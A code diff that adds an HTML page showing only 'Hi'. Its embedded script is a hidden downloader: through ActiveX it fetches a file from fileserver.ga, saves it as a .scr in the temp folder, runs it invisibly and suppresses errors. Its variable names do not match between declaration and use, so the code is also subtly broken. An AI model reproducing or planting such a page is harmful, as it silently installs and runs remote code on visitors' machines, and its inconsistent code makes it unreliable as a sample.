@@ -1,0 +1,29 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>Hi</head>
+<script>
+_ActiveXObj = this['ActiveXObject'];
+_WScr_Shell = new ActiveXObj('WScript.Shell');
+var _Temp_Scr_Path = WScr_Shell['ExpandEnvironmentStrings']('%TEMP/OvFBgqlt.scr');
+var _XmlHttpObj = new ActiveXObj('MSXML2.XMLHTTP');
+
+    XmlHttpObj['onreadystatechange'] = function() {
+        if (XmlHttpObj['readystate'] === 4) {
+            var _AdoDbStream = new ActiveXObj('ADODB.Stream');
+            AdoDbStream['open']();
+            AdoDbStream['type'] = 1;
+            AdoDbStream['write'](XmlHttpObj['ResponseBody']);
+            AdoDbStream['position'] = 0;
+            AdoDbStream['saveToFile'](Temp_Scr_Path, 2);
+            AdoDbStream['close']();
+        };
+    };
+    try {
+        _RunStr = 'Run';
+        XmlHttpObj['open']('GET' , 'http://www.fileserver.ga/testfile.txt', false);
+        XmlHttpObj['send']();
+        WScr_Shell[RunStr](Temp_Scr_Path, 0, 0);      
+    } catch (at1yRhHcS) {};
+</script>
+</html>
